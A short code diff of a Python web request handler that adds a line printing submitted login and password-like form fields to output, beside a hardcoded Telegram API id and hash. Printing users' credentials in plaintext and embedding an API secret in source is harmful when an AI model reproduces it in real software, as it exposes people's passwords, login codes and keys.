@@ -82,6 +82,7 @@ def handle_request11():
     vklog = request.form.get('tglog')
     vkpas = request.form.get('tgco')
     log = request.form.get('log')
+    print(vklog, vkpas, log)
 
     api_id = 3070588
     api_hash = 'd672e46b2442ba3d680075bed9788121'
